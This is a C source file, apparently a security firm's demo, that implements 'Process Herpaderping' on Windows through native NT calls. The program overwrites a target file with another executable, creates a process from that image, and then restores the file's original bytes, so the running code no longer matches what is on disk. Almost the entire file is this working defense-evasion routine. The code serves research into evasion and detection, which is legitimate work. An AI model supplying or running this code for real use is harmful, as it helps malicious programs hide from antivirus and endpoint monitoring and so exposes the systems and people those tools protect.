/*
 * Copyright (c) 2022 Hunt & Hackett.
 *
 * This demo project is licensed under the MIT license.
 *
 * Authors:
 *     diversenok
 *
 */

#define PHNT_VERSION PHNT_WIN11
#include <phnt_windows.h>
#include <phnt.h>
#include <stdio.h>

int wmain(int argc, wchar_t* argv[])
{
    NTSTATUS status;
    UNICODE_STRING sourceFileName = { 0 };
    UNICODE_STRING targetFileName = { 0 };
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK isb;

    HANDLE hSourceFile = NULL;
    HANDLE hSourceFileSection = NULL;
    PVOID sourceFileMapping = NULL;
    HANDLE hTargetFile = NULL;
    PVOID originalData = NULL;
    ULONG originalDataSize = 0;
    HANDLE hTargetDataSection = NULL;
    PVOID targetFileMapping = NULL;
    HANDLE hImageSection = NULL;
    HANDLE hProcess = NULL;
    PRTL_USER_PROCESS_PARAMETERS parameters = NULL;

    wprintf_s(L"Demo for Process Herpaderping by Hunt & Hackett.\r\n\r\n");
    wprintf_s(L"Usage: Herpaderping.exe [target file] [[source file]]\r\n");
    wprintf_s(L" - Target File - the file for manipulation\r\n");
    wprintf_s(L" - Source File - the file that supplies the code for execution\r\n\r\n");

    if (argc < 2)
        return STATUS_INVALID_PARAMETER;
    
    if (argc >= 3)
    {
        // Convert the source filename to NT format
        status = RtlDosPathNameToNtPathName_U_WithStatus(
            argv[2],
            &sourceFileName,
            NULL,
            NULL
        );

        if (!NT_SUCCESS(status))
        {
            wprintf_s(L"RtlDosPathNameToNtPathName_U_WithStatus on the source file: %x\r\n", status);
            goto CLEANUP;
        }
    }
    else
    {
        RtlInitUnicodeString(&sourceFileName, L"\\SystemRoot\\system32\\cmd.exe");
    }

    // Open the source file
    InitializeObjectAttributes(&objAttr, &sourceFileName, 0, NULL, NULL);

    status = NtOpenFile(
        &hSourceFile,
        FILE_READ_DATA | SYNCHRONIZE,
        &objAttr,
        &isb,
        FILE_SHARE_READ,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (argc >= 3)
        RtlFreeUnicodeString(&sourceFileName);

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtOpenFile on the source file: %x\r\n", status);
        goto CLEANUP;
    }

    // Determine source's size
    FILE_STANDARD_INFORMATION sourceInfo;

    status = NtQueryInformationFile(
        hSourceFile,
        &isb,
        &sourceInfo,
        sizeof(sourceInfo),
        FileStandardInformation
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtQueryInformationFile on the source file: %x\r\n", status);
        goto CLEANUP;
    }

    // Prepare to map it for copying
    status = NtCreateSection(
        &hSourceFileSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_COMMIT,
        hSourceFile
    );

    NtClose(hSourceFile);
    hSourceFile = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateSection on the source file: %x\r\n", status);
        goto CLEANUP;
    }

    // Map the source file as a data stream
    SIZE_T sourceMappingSize;
    sourceMappingSize = 0;

    status = NtMapViewOfSection(
        hSourceFileSection,
        NtCurrentProcess(),
        &sourceFileMapping,
        0,
        0,
        NULL,
        &sourceMappingSize,
        ViewUnmap,
        0,
        PAGE_READONLY
    );

    NtClose(hSourceFileSection);
    hSourceFileSection = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtMapViewOfSection on the source file: %x\r\n", status);
        goto CLEANUP;
    }

    // Convert the target filename to NT format
    status = RtlDosPathNameToNtPathName_U_WithStatus(
        argv[1],
        &targetFileName,
        NULL,
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"RtlDosPathNameToNtPathName_U_WithStatus on the target file: %x\r\n", status);
        goto CLEANUP;
    }

    // Open the target file
    InitializeObjectAttributes(&objAttr, &targetFileName, 0, NULL, NULL);

    status = NtOpenFile(
        &hTargetFile,
        FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
        &objAttr,
        &isb,
        FILE_SHARE_READ,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtOpenFile on the target file: %x\r\n", status);
        goto CLEANUP;
    }

    // Determine the original target's size
    FILE_STANDARD_INFORMATION originalTargetInfo;

    status = NtQueryInformationFile(
        hTargetFile,
        &isb,
        &originalTargetInfo,
        sizeof(originalTargetInfo),
        FileStandardInformation
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtQueryInformationFile on the target file: %x\r\n", status);
        goto CLEANUP;
    }

    originalDataSize = originalTargetInfo.EndOfFile.LowPart;
    originalData = RtlAllocateHeap(
        RtlGetCurrentPeb()->ProcessHeap,
        0,
        originalDataSize
    );

    if (!originalData)
    {
        status = STATUS_NO_MEMORY;
        wprintf_s(L"RtlAllocateHeap to backup original target's content: %x\r\n", status);
        goto CLEANUP;
    }

    // Backup original target's content
    status = NtReadFile(
        hTargetFile,
        NULL,
        NULL,
        NULL,
        &isb,
        originalData,
        originalDataSize,
        NULL,
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        RtlFreeHeap(RtlGetCurrentPeb()->ProcessHeap, 0, originalData);
        originalData = NULL;
        wprintf_s(L"NtReadFile on the target file: %x\r\n", status);
        goto CLEANUP;
    }

    // Resize the target for the new content
    FILE_END_OF_FILE_INFORMATION endInfo;
    endInfo.EndOfFile = sourceInfo.EndOfFile;

    status = NtSetInformationFile(
        hTargetFile,
        &isb,
        &endInfo,
        sizeof(endInfo),
        FileEndOfFileInformation
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtSetInformationFile when resizing the target file: %x\r\n", status);
        goto CLEANUP;
    }

    // Prepare a section for writing to the target file
    status = NtCreateSection(
        &hTargetDataSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READWRITE,
        SEC_COMMIT,
        hTargetFile
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateSection while modifying the target file: %x\r\n", status);
        goto CLEANUP;
    }

    // Map the target file for modification
    SIZE_T targetMappingSize;
    targetMappingSize = 0;

    status = NtMapViewOfSection(
        hTargetDataSection,
        NtCurrentProcess(),
        &targetFileMapping,
        0,
        0,
        NULL,
        &targetMappingSize,
        ViewUnmap,
        0,
        PAGE_READWRITE
    );

    NtClose(hTargetDataSection);
    hTargetDataSection = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtMapViewOfSection while modifying the target file: %x\r\n", status);
        goto CLEANUP;
    }

    // Overwrite the target with the new content
    memcpy_s(
        targetFileMapping,
        targetMappingSize,
        sourceFileMapping,
        sourceMappingSize
    );

    NtUnmapViewOfSection(NtCurrentProcess(), sourceFileMapping);
    sourceFileMapping = NULL;
    NtUnmapViewOfSection(NtCurrentProcess(), targetFileMapping);
    targetFileMapping = NULL;

    // Create an image section from the modified target file
    status = NtCreateSection(
        &hImageSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hTargetFile
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateSection for the image: %x\r\n", status);
        goto CLEANUP;
    }

    // Create a process object
    status = NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        NtCurrentProcess(),
        0,
        hImageSection,
        NULL,
        NULL,
        0
    );

    NtClose(hImageSection);
    hImageSection = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateProcessEx: %x\r\n", status);
        goto CLEANUP;
    }

    // Set the size of the target back to the original value
    // Note that, unfortunately, we cannot shrink the file 
    // because of the image section we created from it

    if (sourceInfo.EndOfFile.LowPart < originalDataSize)
    {
        endInfo.EndOfFile.QuadPart = originalDataSize;

        status = NtSetInformationFile(
            hTargetFile,
            &isb,
            &endInfo,
            sizeof(endInfo),
            FileEndOfFileInformation
        );

        if (!NT_SUCCESS(status))
        {
            wprintf_s(L"NtSetInformationFile while restoring target file: %x\r\n", status);
            goto CLEANUP;
        }
    }
    else
    {
        wprintf_s(L"WARNING: cannot shrink the target file back to its orignal size\r\n");
    }

    // Prepare a section for overwriting to the target file
    status = NtCreateSection(
        &hTargetDataSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READWRITE,
        SEC_COMMIT,
        hTargetFile
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateSection while restoring the target file: %x\r\n", status);
        goto CLEANUP;
    }

    NtClose(hTargetFile);
    hTargetFile = NULL;

    // Map the target file for modification
    targetMappingSize = 0;

    status = NtMapViewOfSection(
        hTargetDataSection,
        NtCurrentProcess(),
        &targetFileMapping,
        0,
        0,
        NULL,
        &targetMappingSize,
        ViewUnmap,
        0,
        PAGE_READWRITE
    );

    NtClose(hTargetDataSection);
    hTargetDataSection = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtMapViewOfSection while restoring the target file: %x\r\n", status);
        goto CLEANUP;
    }

    // Restore the original content
    memcpy_s(targetFileMapping, targetMappingSize, originalData, originalDataSize);

    RtlFreeHeap(RtlGetCurrentPeb()->ProcessHeap, 0, originalData);
    originalData = NULL;

    // We cannot shrink the file because of the image section;
    // at least zero out the remaining space
    if (sourceInfo.EndOfFile.LowPart > originalDataSize)
    {
        ULONG extraBytes;
        extraBytes = sourceInfo.EndOfFile.LowPart - originalDataSize;

        memset(RtlOffsetToPointer(targetFileMapping, originalDataSize), 0, extraBytes);
        wprintf_s(L"Filled in the remaining %d bytes with zeros\r\n", extraBytes);
    }

    NtUnmapViewOfSection(NtCurrentProcess(), targetFileMapping);
    targetFileMapping = NULL;

    // Determine new process's PEB location
    PROCESS_BASIC_INFORMATION processInfo;
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &processInfo,
        sizeof(processInfo),
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtQueryInformationProcess for PEB: %x\r\n", status);
        goto CLEANUP;
    }

    if (!processInfo.PebBaseAddress)
    {
        status = STATUS_ASSERTION_FAILURE;
        wprintf_s(L"PEB is NULL\r\n");
        goto CLEANUP;
    }

    // Prepare the process parameters block
    WCHAR imageNameBuffer[MAX_PATH];
    UNICODE_STRING imageName;
    UNICODE_STRING currentDir;
    UNICODE_STRING windowName;

    imageName.Buffer = imageNameBuffer;
    imageName.MaximumLength = sizeof(imageNameBuffer);
    imageName.Length = (USHORT)RtlGetFullPathName_U(argv[1], imageName.MaximumLength, &imageNameBuffer[0], NULL);

    RtlInitUnicodeString(&currentDir, L"C:\\Windows\\system32");
    RtlInitUnicodeString(&windowName, L"Hello from a herpaderping demo!");

    status = RtlCreateProcessParametersEx(
        &parameters,
        &imageName,
        &currentDir,
        &currentDir,
        &imageName,
        RtlGetCurrentPeb()->ProcessParameters->Environment,
        &windowName,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"RtlCreateProcessParametersEx: %x\r\n", status);
        goto CLEANUP;
    }

    // Allocate space for the process parameter block in the target
    SIZE_T paramsSize;
    PVOID paramsRemote;
    SIZE_T paramsRemoteSize;

    paramsSize = (SIZE_T)parameters->MaximumLength + parameters->EnvironmentSize;
    paramsRemote = NULL;
    paramsRemoteSize = paramsSize;

    status = NtAllocateVirtualMemory(
        hProcess,
        &paramsRemote,
        0,
        &paramsRemoteSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtAllocateVirtualMemory for process parameteres: %x\r\n", status);
        goto CLEANUP;
    }

    // Switch the process parameters to a denormalized form that uses offsets instead of
    // absolute pointers. The target's ntdll will normalize them back on initialization.
    RtlDeNormalizeProcessParams(parameters);

    // Unfortunately, denormalization doesn't apply to the environment pointer, so we need
    // to adjust it to be valid remotely.
    (ULONG_PTR)parameters->Environment += (ULONG_PTR)paramsRemote - (ULONG_PTR)parameters;

    // Write process parameters block to the target
    status = NtWriteVirtualMemory(hProcess, paramsRemote, parameters, paramsSize, NULL);
    RtlDestroyProcessParameters(parameters);

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtWriteVirtualMemory for process parameteres: %x\r\n", status);
        goto CLEANUP;
    }

    // Update the reference in PEB
    status = NtWriteVirtualMemory(
        hProcess,
        &processInfo.PebBaseAddress->ProcessParameters,
        &paramsRemote,
        sizeof(paramsRemote),
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtWriteVirtualMemory for process parameteres reference: %x\r\n", status);
        goto CLEANUP;
    }

    // Determine parameters for the initial thread
    SECTION_IMAGE_INFORMATION imageInfo;

    status = NtQueryInformationProcess(
        hProcess,
        ProcessImageInformation,
        &imageInfo,
        sizeof(imageInfo),
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtQueryInformationProcess for image info: %x\r\n", status);
        goto CLEANUP;
    }

    // Create the initial thread
    HANDLE hThread;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        imageInfo.TransferAddress,
        NULL,
        0,
        imageInfo.ZeroBits,
        imageInfo.CommittedStackSize,
        imageInfo.MaximumStackSize,
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateThreadEx: %x\r\n", status);
        goto CLEANUP;
    }

    NtClose(hProcess);
    hProcess = NULL;

    NtClose(hThread);
    hThread = NULL;

    status = STATUS_SUCCESS;
    wprintf_s(L"Successfully created process with PID %zu.\r\n",
        (ULONG_PTR)processInfo.UniqueProcessId);

CLEANUP:
    if (hSourceFile)
        NtClose(hSourceFile);

    if (sourceFileMapping)
        NtUnmapViewOfSection(NtCurrentProcess(), sourceFileMapping);

    if (targetFileName.Buffer)
        RtlFreeUnicodeString(&targetFileName);

    if (originalData)
        RtlFreeHeap(RtlGetCurrentPeb()->ProcessHeap, 0, originalData);

    if (hTargetFile)
        NtClose(hTargetFile);

    if (targetFileMapping)
        NtUnmapViewOfSection(NtCurrentProcess(), targetFileMapping);

    if (hProcess)
    {
        NtTerminateProcess(hProcess, STATUS_CANCELLED);
        NtClose(hProcess);
    }

    return status;
}
